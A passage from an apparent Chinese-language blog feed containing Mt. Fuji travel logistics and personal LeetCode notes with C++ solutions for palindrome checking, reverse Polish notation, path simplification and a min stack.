flat"><p><strong>開放Check-In 時間:</strong> 14:00 後<br><strong>Check-Out 時間:</strong> 0:00 ~ 6:00<br><strong>取消政策: 如果因為個人原因取消山屋，則會被收取取消費用</strong><br><strong>不住宿</strong>　：　100%<br><strong>當日</strong>　：　100%<br><strong>前日</strong>　：　 80%<br><strong>9日前</strong>　：　 50%<br><strong>20日前</strong>　：　 30%</p><p>如果吉田路線在入住當天關閉，或者如果山梨縣或靜岡縣指示您禁止登山，則免除取消費用。</p></div><h1 id="交通安排"><a href="#交通安排" class="headerlink" title="交通安排"></a>交通安排</h1><p>這次選擇先抵達河口湖過夜，隔日早晨再從河口湖出發五合目</p><h2 id="成田機場-→-新宿"><a href="#成田機場-→-新宿" class="headerlink" title="成田機場 → 新宿"></a>成田機場 → 新宿</h2><p>我自己是搭乘京成特快 NEX，可以先用 Klook 或者 KKday 先買好，取得QR Code，再去機場的NEX機台兌換。</p><p><img src="/img/Mountain/Mt.Fuji/nex.jpg"></p><h2 id="新宿-→-河口湖"><a href="#新宿-→-河口湖" class="headerlink" title="新宿 → 河口湖"></a>新宿 → 河口湖</h2><p>接著就是搭乘高速巴士到河口湖站過夜，有事先在高速巴士網站上預約新宿車站到河口湖站的車票</p><p>行動車票會像是下面這樣，再交給乘務員掃瞄檢查即可上車<br><img src="/img/Mountain/Mt.Fuji/highwaybus.jpeg"></p><blockquote><p>高速巴士網站: <a href="https://highway-buses.jp/chi/">https://highway-buses.jp/chi/</a></p></blockquote><h2 id="河口湖-→-五合目"><a href="#河口湖-→-五合目" class="headerlink" title="河口湖 → 五合目"></a>河口湖 → 五合目</h2><p>可以線上預約車票，第一班車，在使用車票時，可以點選啟用票券，<strong>建議等車到再點選啟用，啟用後會開始倒數計時兩小時，兩小時候票券會作廢。</strong></p><p><img src="/img/Mountain/Mt.Fuji/fujikyubus.png"></p><p>河口湖站的候車地點會是在 7號站牌。</p><p><img src="/img/Mountain/Mt.Fuji/bustop.jpg"></p><blockquote><p>接駁巴士車票預約: <a href="https://fujikyubus.quicktrip.jp/bought">https://fujikyubus.quicktrip.jp/bought</a></p></blockquote><p>如果要去富士山五合目，一定要注意時間，我們去是趕第一班 6:40分的車，但巴士遲到了一下，到達五合目大概是7:45左右</p><p><img src="/img/Mountain/Mt.Fuji/time.jpeg"></p><blockquote><p>富士巴士時刻表: <a href="https://www.fujikyubus.co.jp/mycar/timetablefares/">https://www.fujikyubus.co.jp/mycar/timetablefares/</a></p></blockquote><p><img src="/img/Mountain/Mt.Fuji/5stage.jpg"></p><p>題外話，第一天起登到御來光館起大霧跟暴雨，十分狼狽的一天，雨衣雨褲，防寒衣物務必要準備好，上山路上看到許多穿短袖短褲快冷死的外國人….，登山分享可能之後再整理XD</p><p>另外，去跟回的車票可以一次買，但回程到河口湖的巴士建議爬完後再買，除非你很能控制上下山的時間，下山後也可以去神社或者旁邊的紀念品店晃晃~</p><h1 id="參考"><a href="#參考" class="headerlink" title="參考"></a>參考</h1><p>完整的富士路線地圖(pdf檔)- <a href="https://www.fujisan-climb.jp/tc/b2rg1t00000018zh-att/map_tc.pdf">https://www.fujisan-climb.jp/tc/b2rg1t00000018zh-att/map_tc.pdf</a></p>]]></content>
      
      
      <categories>
          
          <category> 爬山健行 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Travel </tag>
            
            <tag> Mountain </tag>
            
            <tag> hiking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有效回文 | Easy | LeetCode#125. Valid Palindrome</title>
      <link href="/posts/7abe6380.html"/>
      <url>/posts/7abe6380.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/125/question.jpeg"></p><p><img src="/img/LeetCode/125/question2.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 題目給定字串 <code>s</code>，當你把字串中的大寫字母轉換成小寫字母，並且把所有非字母或數字類的符號去除，如果從頭讀到尾跟從尾讀到頭都是一樣的字串，那就是一個有效的 <strong>回文(Palindrome)</strong> ，若回文有效就返回 true，反之則 false，<code>s</code> 僅包含ASCII當中可印出的符號。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><ul><li>先將題目字串 <code>s</code> 中的大寫字母轉為小寫，並且將其餘符號去除</li><li>這部分可以宣告一個新的空字串，並且分別處理數字、大寫字母以及小寫字母</li><li>接著就是判斷回文，可透過迴圈同時檢查字串的頭跟尾是否一樣，若有發現不一致則回傳false，反之則True</li><li>頭尾pointer僅需scan到字串的中間即可</li></ul><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">bool</span> isPalindrome = <span class="literal">false</span>;</span><br><span class="line">        string tempStr=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(s.<span class="built_in">size</span>()==<span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c:s)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c &gt;= <span class="number">48</span> &amp;&amp; c&lt;=<span class="number">57</span>)&#123;</span><br><span class="line">                tempStr+=c;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(c&gt;= <span class="number">65</span> &amp;&amp; c&lt;=<span class="number">90</span>)&#123;</span><br><span class="line">                tempStr+=c+<span class="number">32</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(c&gt;=<span class="number">97</span> &amp;&amp; c&lt;=<span class="number">122</span>)&#123;</span><br><span class="line">                tempStr+=c;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(tempStr == <span class="string">&quot;&quot;</span> ) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">int</span> length=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (tempStr.<span class="built_in">size</span>() %<span class="number">2</span> != <span class="number">0</span>)&#123;</span><br><span class="line">            length = ((<span class="type">int</span>)tempStr.<span class="built_in">size</span>()/<span class="number">2</span>)+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            length = ((<span class="type">int</span>)tempStr.<span class="built_in">size</span>()/<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (tempStr[i]!=tempStr[tempStr.<span class="built_in">size</span>()-i<span class="number">-1</span>])&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                isPalindrome = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> isPalindrome;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以參考 Ascii Table</p><p><img src="/img/LeetCode/125/ascii.png"></p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/125/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li>首先在遍歷跟轉換字串的迴圈，複雜度為 $O(n)$，$n$ 為字串數量</li><li>接下來 two pointer 檢查回文的地方，複雜度為 $O(m&#x2F;2)$，worst case 會是 $m&#x3D;n$</li><li>整體時間複雜度會是 $O(n)+O(m&#x2F;2) &#x3D; O(n)$</li></ul><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><ul><li>程式碼中建立了一個新的字串 <code>tempStr</code>，其最壞情況下的長度為 n。因此，這段程式碼的空間複雜度是 $O(n)$</li><li><code>isPalindrome </code> 和 <code>length</code> 這些變數只佔用常數空間，因此其空間複雜度是 $O(1)$</li></ul>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Two Pointers </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>計算逆波蘭表示法 | Medium | LeetCode#150. Evaluate Reverse Polish Notation</title>
      <link href="/posts/49a7f4a8.html"/>
      <url>/posts/49a7f4a8.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/150/question1.jpeg"><br><img src="/img/LeetCode/150/question2.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目描述: 本題要求給定一個字串陣列 <code>tokens</code>，當中是以 <strong><a href="https://zh.wikipedia.org/wiki/%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E7%A4%BA%E6%B3%95">逆波蘭表示法</a></strong> 的算式運算式，需要回傳算術運算的結果，結果為整數型態。</li></ul><p>注意:</p><ul><li>有效的運算子只會有: <code>+</code>, <code>-</code>, <code>*</code>,<code>/</code>。</li><li>Operand 都會是整數</li><li>除法採無條件捨去法</li><li>不可除以0</li><li>中間運算的數字會是 32-bit 整數</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>如果看上面的範例 <code>[&quot;4&quot;,&quot;13&quot;,&quot;5&quot;,&quot;/&quot;,&quot;+&quot;]</code>，可以看出，如果碰到operator，碰到operator前的兩個數字就會透過該operator進行運算。</p><p>因此我的想法是:</p><ol><li>建立一個stack</li><li>迭代 <code>tokens</code> 若遇到數字就push進stack</li><li>若遇到運算子，則將兩個元素pop出來進行四則運算</li><li>運算結果丟回 stack</li><li>迭代完畢後回傳 stacK 頂端元素</li></ol><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">evalRPN</span><span class="params">(vector&lt;string&gt;&amp; tokens)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; sk;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; tokens.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            string token = tokens[i];</span><br><span class="line">            <span class="keyword">if</span> (token == <span class="string">&quot;+&quot;</span> || token == <span class="string">&quot;-&quot;</span> || token == <span class="string">&quot;*&quot;</span> || token == <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">                <span class="type">int</span> arg2 = sk.<span class="built_in">top</span>(); sk.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="type">int</span> arg1 = sk.<span class="built_in">top</span>(); sk.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (token == <span class="string">&quot;+&quot;</span>) sk.<span class="built_in">push</span>(arg1 + arg2);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (token == <span class="string">&quot;-&quot;</span>) sk.<span class="built_in">push</span>(arg1 - arg2);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (token == <span class="string">&quot;*&quot;</span>) sk.<span class="built_in">push</span>(arg1 * arg2);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (token == <span class="string">&quot;/&quot;</span>) sk.<span class="built_in">push</span>(<span class="built_in">floor</span>(arg1 / arg2));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sk.<span class="built_in">push</span>(<span class="built_in">stoi</span>(token));  <span class="comment">// Use stoi to convert string to int</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sk.<span class="built_in">top</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>這裡宣告的 stack 是 <code>int</code> type 的，所以在push的時候要注意 type的轉換，這裡用<string> 當中的 <code>stoi</code> 函數將字串轉換成整數。</li><li>另外還要注意，pop出來的第一個元素會是在operator後面，也就是如過現在是除法，那要pop出來的元素就會是分子，所以順序要注意</li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/150/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>時間複雜度：$O(n)$，其中 n 是輸入tokens的數量。</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>空間複雜度：$O(n)$，其中 n 是輸入tokens的數量。</p><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p>這次紙上先寫出演算法大概花7分鐘，實際寫大概20min AC，還是有待加強。</p><blockquote><p>Note: 字串轉數字:<code>stoi()</code>，數字轉字串: <code>to_string()</code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>簡化路徑 | Medium | LeetCode#71. Simplify Path</title>
      <link href="/posts/59f3a7b5.html"/>
      <url>/posts/59f3a7b5.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/71/question1.jpeg"><br><img src="/img/LeetCode/71/question2.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 題目會給定一個 Unix 系統的檔案路徑字串，這題需要簡化路徑，並輸出簡化後的路徑字串。簡化路徑有下面幾項規則:<ul><li>字串始終由 <code>/</code> 開始</li><li>路徑中的目錄僅可由一個 <code>/</code> 分隔開</li><li>除了 Root Dir 之外，不可由 <code>/</code> 作為字串結尾</li><li>輸出需要排除 <code>.</code> 或者 <code>..</code></li></ul></li></ul><p>在 Unix 系統中 <code>.</code> 代表當前目錄，可忽略，<code>..</code> 代表跳到上一層目錄，舉例來說 <code>/home/kevin/../LeetCode</code> &#x3D; <code>/home/LeetCode</code>  </p><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><ul><li>獲取 <code>/</code> 與 <code>/</code> 中間的字串(即目錄)，如果滿足規則就 push 進 stack 中</li><li>如果 <code>/</code>與 <code>/</code> 中間會是 <code>.</code> 則跳過，如果是 <code>..</code> 則將stack中元素 pop 出來</li><li>其餘的通通 push 到 stack 當中</li><li>之後就是依序將 stack 元素 pop 出來並串接在回傳字串當中</li></ul><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">simplifyPath</span><span class="params">(string path)</span> </span>&#123;</span><br><span class="line">        string output=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        stack&lt;string&gt; sk;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;path.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(path[i]==<span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            string temp=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;path.<span class="built_in">size</span>() &amp;&amp; path[i] != <span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">            temp += path[i];</span><br><span class="line">            ++i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(temp==<span class="string">&quot;.&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(temp==<span class="string">&quot;..&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!sk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                    sk.<span class="built_in">pop</span>();    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                sk.<span class="built_in">push</span>(temp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(!sk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            output = <span class="string">&#x27;/&#x27;</span>+sk.<span class="built_in">top</span>() + output;</span><br><span class="line">            sk.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(output.<span class="built_in">size</span>() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> output;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>初始化變數</li><li>遇到 <code>/</code> 直接跳過</li><li>使用 <code>temp</code> 來記錄目錄名稱直到遇到下一個 <code>/</code></li><li>如果 <code>temp</code> 會是 <code>.</code> ，代表當前目錄，直接跳過</li><li>如果 <code>temp</code> 會是 <code>..</code> ，代表上一層目錄，若 stack 非空，則直接將 stack 頂端元素 pop出來</li><li>其他狀況都將 <code>temp</code> push 到 stack 中</li><li>之後依序將 stack 元素加到 <code>output</code> 中</li><li>單獨處理簡化後只剩下 Root Dir的狀況</li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/71/results.jpeg"></p><h1 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li>Traverse輸入字串: $o(n)$, n為字串長度</li><li>push, pop: $O(1)$</li><li>建構輸出: $o(m)$, m為stack中元素數量<br>整體而言會是 $O(n)$</li></ul><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><ul><li>在最壞情況下，如果所有的 <code>temp</code> 都是有效的路徑段落，stack中會存儲 n 個段落。因此，stack的空間複雜度是 $O(n)$</li><li>最終輸出的字串 <code>output</code> 也會最多包含 n 個字元，因此它的空間複雜度是 $O(n)$</li><li>整段程式碼的空間複雜度是 $O(n)$</li></ul>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Min 堆疊 | Medium | LeetCode#155 Min Stack</title>
      <link href="/posts/511cdb2f.html"/>
      <url>/posts/511cdb2f.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/155/question.jpeg"><br><img src="/img/LeetCode/155/question2.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 題目要求設計一個 Stack, 可以支援 push, pop, top 以及在常數時間內獲取最小值</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MinStack</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> val, size = <span class="number">0</span>;</span><br><span class="line">    MinStack *next;</span><br><span class="line">    MinStack *Top = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MinStack</span>() : <span class="built_in">val</span>(<span class="number">0</span>), <span class="built_in">next</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line">    <span class="built_in">MinStack</span>(<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line">    <span class="built_in">MinStack</span>(<span class="type">int</span> x, MinStack *nextNode) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(nextNode) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> val)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pop</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getMin</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MinStack::push</span><span class="params">(<span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        Top = <span class="keyword">new</span> <span class="built_in">MinStack</span>(val);</span><br><span class="line">        size++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    MinStack *newNode = <span class="keyword">new</span> <span class="built_in">MinStack</span>(val);</span><br><span class="line">    newNode-&gt;next = Top;</span><br><span class="line">    Top = newNode;</span><br><span class="line">    size++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MinStack::pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    MinStack *tempNode = Top;</span><br><span class="line">    Top = Top-&gt;next;</span><br><span class="line">    <span class="keyword">delete</span> tempNode;</span><br><span class="line">    size--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">MinStack::top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> Top-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">MinStack::getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    MinStack *ptr = Top;</span><br><span class="line">    <span class="type">int</span> minValue = ptr-&gt;val;</span><br><span class="line">    <span class="keyword">while</span> (ptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ptr-&gt;val &lt; minValue) &#123;</span><br><span class="line">            minValue = ptr-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr = ptr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> minValue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">MinStack::isEmpty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Top == <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MinStack object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MinStack* obj = new MinStack();</span></span><br><span class="line"><span class="comment"> * obj-&gt;push(val);</span></span><br><span class="line"><span class="comment"> * obj-&gt;pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj-&gt;top();</span></span><br><span class="line"><span class="comment"> * int param_4 = obj-&gt;getMin();</span></span><br><span class="line"><span class="comment"> 